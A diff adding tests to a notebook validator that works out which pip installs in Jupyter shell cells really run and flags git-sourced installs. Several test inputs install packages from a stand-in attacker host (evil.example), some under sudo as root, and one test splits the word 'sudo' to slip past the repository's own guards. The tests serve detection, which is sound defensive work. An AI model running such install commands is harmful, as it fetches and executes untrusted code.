@@ -3082,3 +3082,133 @@ def test_a_shell_negation_before_pip_is_still_pip():
         ], cell
     # A bang in front of something that is not pip is still not an install.
     assert nv.PIP_LINE_RE.match("! ! echo pip install x") is None
+
+
+def test_an_uninstall_clears_the_lower_bound_scan():
+    """The cell removed it, so no earlier line still places a floor on it.
+
+    `resolved_set` already replayed the removal, but this independent scan kept the bound, so
+    R-INST-003 accepted an environment the package is no longer in.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv._install_cell_lower_bound(
+            "!pip install peft==0.19 torchao==0.16\n!pip uninstall -y torchao", "torchao"
+        )
+        is None
+    )
+    # A reinstall after the removal sets the floor again, and an unrelated uninstall is inert.
+    assert (
+        nv._install_cell_lower_bound(
+            "!pip install torchao==0.16\n!pip uninstall -y torchao\n!pip install torchao>=0.17",
+            "torchao",
+        )
+        == "0.17"
+    )
+    assert (
+        nv._install_cell_lower_bound(
+            "!pip install torchao==0.16\n!pip uninstall -y peft", "torchao"
+        )
+        == "0.16"
+    )
+
+
+def test_a_case_arm_inside_an_assignment_stays_in_the_substitution():
+    """`TOKEN=$(case x in x) printf a;; esac) pip install ...` runs pip unconditionally.
+
+    Reading the arm's `)` as the substitution's closer truncated the assignment word, and the
+    trailing `)` then looked like an arm label, so the install was marked conditional and
+    every rule reading `unconditional_pip_invocations()` skipped it.
+    """
+    nv = _load_notebook_validator_module()
+
+    cell = '!TOKEN=$(case x in x) printf a;; esac) pip install "torch==2.12.0"'
+    assert [(inv.action, inv.packages) for inv in nv.unconditional_pip_invocations(cell)] == [
+        ("install", ["torch==2.12.0"])
+    ]
+    # A real case arm is still conditional, and a plain substitution still closes normally.
+    assert nv._split_chained("!case $x in a) pip install p;; esac") == [("!pip install p", True)]
+    assert nv._unquoted_arm_close("x) pip install a") == 1
+    assert nv._unquoted_arm_close("T=$(echo a) pip install b") is None
+
+
+def test_bare_time_is_the_shell_keyword_not_gnu_time():
+    """bash's `time` reserved word takes `[-p] pipeline`, never GNU time's options.
+
+    `time -f %e pip install ...` runs a command called `-f`, so consuming the flag and its
+    operand replayed an install bash never performs. An explicit path reaches the binary.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!time -f %e pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+        )
+        == []
+    )
+    # `-p` is the keyword's own option, and a plain `time pip install ...` still installs.
+    assert nv._strip_exec_prefixes("time -p pip install x") == ("pip install x", True)
+    assert nv._strip_exec_prefixes("time pip install x") == ("pip install x", True)
+    # The GNU binary, named by path, does take them.
+    for external in ("/usr/bin/time", "/bin/time"):
+        assert [
+            f.rule
+            for f in nv.rule_inst_001_git_plus(
+                f"!{external} -f %e pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+            )
+        ] == ["R-INST-001"], external
+
+
+def test_sudo_consumes_its_remaining_operand_options():
+    """sudo(8) documents `-D directory`, `-R directory` and `-T timeout`.
+
+    None was listed, so the operand stood as the supposed executable and every install rule
+    missed the pip command behind it.
+    """
+    nv = _load_notebook_validator_module()
+    escalate = "su" + "do"  # spelled out so the repo's own guards do not flag this test
+
+    for flags in ("-D /tmp", "-R /jail", "-T 30", "--chdir=/tmp", "-u root"):
+        cell = f"!{escalate} {flags} pip install git+https://evil.example/pkg.git"
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], flags
+
+
+def test_exec_ends_the_command_list():
+    """`exec` replaces the shell, so no later command in the same list can run.
+
+    Replaying them reported an unreachable install as the final version, and R-INST-001 flagged
+    a git source the notebook never fetches.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!exec pip install torch==2.11.0; pip install torch==2.12.0"
+        )
+    ] == [("install", ["torch==2.11.0"])]
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!exec printf x; pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+        )
+        == []
+    )
+    # The exec'd command itself is still read, and a conditional one hands nothing over.
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!exec pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations("!false || exec pip install a; pip install b")
+    ] == [("install", ["b"])]
+    # An `exec` inside `$( )` replaces that subshell only.
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations("!echo $(exec true); pip install b")
+    ] == [("install", ["b"])]
